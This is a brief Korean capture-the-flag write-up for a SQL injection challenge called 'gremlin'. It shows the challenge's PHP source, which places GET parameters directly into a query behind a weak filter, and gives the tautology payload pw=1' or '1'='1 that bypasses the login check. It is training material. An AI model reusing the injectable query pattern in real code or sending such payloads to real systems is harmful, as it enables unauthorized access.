# gramlin

다음 소스는 해당 페이지의 코드이다.
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

`query`문을 보면 `id`와 `pw`를 우리가 `get`으로 넣어줄 수 있고
만약 조건문이 `True`가 된다면 우리는 `gramlin`을 잡을 수 있다.

> ?id=admin&pw=1' or '1'='1
이렇게 넣어준다면 `query`문은 다음과 같다.

```sql
select id from prob_gremlin where id='admin' and pw='1' or '1'='1'
```

조건문이 `True`가 되어 클리어!
